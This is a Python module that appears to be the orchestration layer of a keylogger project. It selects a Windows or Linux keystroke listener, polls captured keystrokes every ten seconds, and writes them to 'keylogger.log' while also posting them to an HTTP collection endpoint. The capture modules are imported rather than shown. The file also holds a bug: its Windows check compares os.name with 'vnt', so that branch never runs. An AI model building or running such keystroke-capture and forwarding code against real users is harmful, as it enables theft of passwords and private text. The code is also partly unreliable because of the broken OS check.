import logging
import os
import threading
import time
from typing import Protocol

from keylogger.file_writer import FileWriter
from network_writer import NetworkWriter
from sinker import Sinker
from processor import  Processor
from listner import LinuxKeylogger, WindowsKeylogger, Listener

logger = logging.getLogger(__name__)


class Manager(Protocol):
    """
    Manager is a protocol that defines the interface for managing the keylogger.
    """

    sink: Sinker
    processor: Processor
    listner: Listener

    def start(self) -> None:
        """
        start the manager.
        """
        ...

    def stop(self) -> None:
        """
        stop the manager.
        """
        ...


class DefaultManager:
    """
    DefaultManager is a class that implements the Manager protocol.

    every 10 seconds, it gets the data from the listener, processes it using the processor,
    and then sinks the processed data using the sink.
    """

    def __init__(self):
        # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
        if os.name == "vnt":
            keylogger = WindowsKeylogger()
        else:
            keylogger = LinuxKeylogger()

        self.processor = Processor("")
        self.sink = [FileWriter("keylogger.log"),NetworkWriter("http://localhost:5000/data")]
        self.listner = keylogger
        self.interval = 10
        self._loop_thread = threading.Thread(target=self._loop)
        self._stopped = False

    def start(self) -> None:
        self.listner.start()
        self._loop_thread.start()

    def stop(self) -> None:
        self.listner.stop()
        self._stopped = True
        self._loop_thread.join()

    def run(self) -> None:
        self.start()
        while True:
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                print("Press Ctrl+C again to exit immediately")
                logger.info(
                    "Stopping the keylogger... (Press Ctrl+C again to exit immediately)"
                )
                self.stop()
                break

    def _loop(self):
        # the main loop that gets the data from the listener, processes it, and then sinks it.
        while not self._stopped:
            data = self.listner.get_data()
            if data:
                processed_data = self.processor.process_data(data)
                for sink in self.sink:
                    sink.sink(processed_data)
            time.sleep(self.interval)
